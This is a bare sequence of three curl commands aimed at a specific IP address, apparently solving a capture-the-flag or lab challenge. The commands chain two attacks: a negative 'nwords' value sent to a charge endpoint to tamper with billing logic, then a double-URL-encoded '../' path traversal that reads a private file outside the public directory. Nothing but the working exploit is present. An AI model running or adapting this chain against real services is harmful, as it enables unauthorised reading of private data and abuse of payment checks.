curl -X POST -c cookies.txt "http://3.64.250.135:9000/api/charge?nwords=-2"
curl -b cookies.txt "http://3.64.250.135:9000/api/stats"
curl -b cookies.txt "http://3.64.250.135:9000/api/read/public/%252e%252e/private/A-Secret-Tale.txt"